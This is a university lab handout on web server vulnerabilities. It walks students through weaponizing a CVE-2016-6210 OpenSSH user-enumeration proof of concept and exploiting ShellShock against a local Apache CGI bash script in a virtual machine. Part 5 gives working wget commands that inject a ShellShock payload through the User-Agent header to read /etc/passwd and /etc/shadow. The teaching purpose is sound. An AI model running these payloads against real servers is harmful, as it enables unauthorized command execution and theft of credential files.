# Web Server Vulnerabilities #

This time we are going to look at some of vulnerabilities of Web servers. We will be covering two vulnerabilities: the ShellShock vulnerability from 2014 and a  OpenSSHD vulnerability from 2016.

# Part 1: OpenSSHD Weaponization #

In 2016, OpenSSHD had a vulnerability that could allow a remote user to enumerate users on a SSHD running system. We will take a proof of concept of the vulnerability and weaponize it.

First, Go to the CERT Coordination Center: [http://cert.org/](http://cert.org/)

**Question 1** What is the purpose of the CERT Coordination Center?

**Question 2** What is a CVE?

Now, this OpenSSHD vulnerability has a CVE of CVE-2016-6210. You can find more details about this vulnerability by visiting [https://www.exploit-db.com/exploits/40113/](https://www.exploit-db.com/exploits/40113/ "here").


**Question 3** Based on the link, how is OpenSSHD vulnerable?

This website provides a short snippet of Python code demonstrating how this vulnerability could be exploited. Your goal is to weaponize this vulnerability by integrating the sample code into the provided `template.py` wrapper.

We have set up a vulnerable server for you to test with. The server you will attempt to log into is found at `TBD`. Once you have integrated the sample into the template, you can run it with the following:

> python opensshd.py [-h] [-u --userlist USERLIST_FILE] target_ip

Create a user list text file and fill it with potential usernames. Your goal is to try and find out whether some users exist on this server. Feel free to run the script a couple of times to get a better sense of the results. Try populating your user list with the following users (one per line):

| user    |
|---------|
| user1   |
| user2   |
| user3   |
| user4   |

**Question 4** Copy your script's results into your report. Based on the results, which users do you think exist on this server?

**Question 5** How does knowing potential user accounts on the server compromise its security?

# Part 2: VirtualBox Setup

For the remainder of this lab, you will run a VirtualBox virtual machine that you can fully configure as a superuser. I have prepared one for you.

Each of the lab machines has access to a shared directory at `/seng/seng360/`. Look for the `vm` folder. In it, you should see three files named `seng360bare.*` and a `Logs` folder. This is the base VM image you will be **copying** from.

You will want to copy that entire VM folder to your local machine's temp directory under your own username. So for example, you would be copying it to `/tmp/user/vm` where **user** is your unix username. You can achieve this with the following:

	mkdir -p /tmp/user/vm
	cp -r /seng/seng360/vm /tmp/user

Move to your new VM directory, and then start up `virtualbox` in command line:

	cd /tmp/user/vm
	virtualbox

At this point, no virtual box is setup up. Go to *File > Preferences* and in the *General* section change the *Default Machine Folder* to point to the directory you created above (i.e. `/tmp/user`). Leave everything else the same.

Now add the virtual machine: Using the menu option *Machine > Add*, select the virtual machine inside your `/tmp/user/vm` directory.

At this point you main screen should be something like this:

![VirtualBox Screen](/lab06/vmBare.png)
  
## Configure the Virtual Machine ##

Make sure that the following ports are been forwarded in the your virtual machine. You can do so by looking under *Settings > Network > Advanced > Port Forwarding*.

| Name | Protocol | Host Port | Guest IP | Guest Port |
|------|----------|-----------|----------|------------|
| HTTP | TCP      | 3080      |          | 80         |
| SSH  | TCP      | 3030      |          | 22         |

- Note: you may encounter a disk image warning from VirtualBox. It should be safe to ignore.

## Start your Virtual Machine ##

Once you run the virtual machine, you should be able to SSH to the virtual machine using port 3080 in the local machine, and the webserver will be running in port 3080. You can test port 3080 by going to [http://localhost:3080](http://localhost:3080)

- See: [http://stackoverflow.com/questions/5906441/how-to-ssh-to-a-virtualbox-guest-externally-through-a-host](http://stackoverflow.com/questions/5906441/how-to-ssh-to-a-virtualbox-guest-externally-through-a-host)

To test if SSH is working do:

	ssh -p 3030 -l user360 localhost

To become root in the virtual machine you will need to use the command `su` (use the root password provided).

| what | user    | password   |
|------|---------|------------|
| user | user360 | user360    |
| root | root    | root360lab |

# Part 3: The ShellShock Bug #

You may have heard of the ShellShock bug from 2014. You can read up on it [here](https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29).

**Question 6** What are the CVEs that relate to the ShellShock bug?

Find and read Vulnerability Note [VU#252743](http://www.kb.cert.org/vuls/id/252743). This note will point you to a RedHat blog where the bug is described.

**Question 7** What are the tests for the vulnerabilities in each of the main two CVEs?

Given your answer to **Question 7**, try the two tests to check if `bash` is vulnerable (it is).

# Part 4: Apache Setup #

Your virtual machine is already running Apache on port 80 (port 3080 for this host machine). Apache configuration files are located in the VM at `/etc/apache2`

## Enable cgi ##

Make sure you are in superuser mode with `su`. Enable the cgi module using:

	a2enmod cgi

Restart the apache server.

	service apache2 restart

## Create a script to test cgi ##

Create a simple "hello world" script in perl. Test it. Call this script `test.cgi` and place it in the `/usr/lib/cgi-bin` folder. Place it such that you can access it at [http://localhost:3080/cgi-bin/test.cgi](http://localhost:3080/cgi-bin/test.cgi) (from the host machine) to test it.

```perl
#!/usr/bin/perl
print "Content-type: text/html\n\n";
print "Hello, world!\n";
```

- Resource: [http://www.lies.com/begperl/hello_cgi.html](http://www.lies.com/begperl/hello_cgi.html)
- Note: You'll likely need to edit the test.cgi permissions so that the server can run that file: `chmod 755 test.cgi`
- If necessary, you can inspect the access/error logs of apache. They are located at `/var/log/apache2/error.log`.

## Create a bash script ##

Now that you can run cgi scripts, make a bash script called `test.bash`

```bash
#!/bin/bash
echo "Content-type: text/plain"
echo
echo
echo "Hello world"
whoami
echo "End of the world"
```

Test it at [http://localhost:3080/cgi-bin/test.bash](http://localhost:3080/cgi-bin/test.bash).

**Question 8** What user is the one executing the scripts? (see the output of whoami above). Why does apache use that user?

## /etc/passwd and /etc/shadow ##

Quickly skim the man page of shadow (`man shadow`). Inspect the files `/etc/passwd` and `/etc/shadow`

**Question 9** Why does Linux maintain `/etc/shadow`?

**Question 10** What is the difference between `/etc/passwd` and `/etc/shadow`?

# Part 5: ShellShock Attack #

Now we can try the attack.

- Do the following steps outside the virtual machine.

Using `wget` run:

```bash
wget -O ~/output.txt -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost:3080/cgi-bin/test.bash
```

Test it. What do you get in `output.txt`?

**Question 11** Given your knowledge of the vulnerability, explain how the attack works.

Try it again.

```bash
wget -O ~/output.txt -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/shadow" http://localhost:3080/cgi-bin/test.bash
```

**Question 12** Explain why this attack didn't work.

**Question 13** What is the vulnerability in the /etc/passwd attack?

- Try modifying your wget script attack to try other commands. Try to execute, for example `ls -lR /etc` or `ls -lR /home/`.

## How the attack is passed to bash ##

From Wikipedia:

> When a web server uses the Common Gateway Interface (CGI) to handle a document request, it passes various details of the request to a handler program in the environment variable list. For example, the variable HTTP_USER_AGENT has a value that, in normal usage, identifies the program sending the request. If the request handler is a Bash script, or if it executes one for example using the system(3) call, Bash will receive the environment variables passed by the server and will process them as described above. This provides a means for an attacker to trigger the Shellshock vulnerability with a specially crafted server request.

> Security documentation for the widely used Apache web server states: "CGI scripts can ... be extremely dangerous if they are not carefully checked."

# Submission #

You will be submitting one file:

- `report.txt` Your answers to the 13 questions
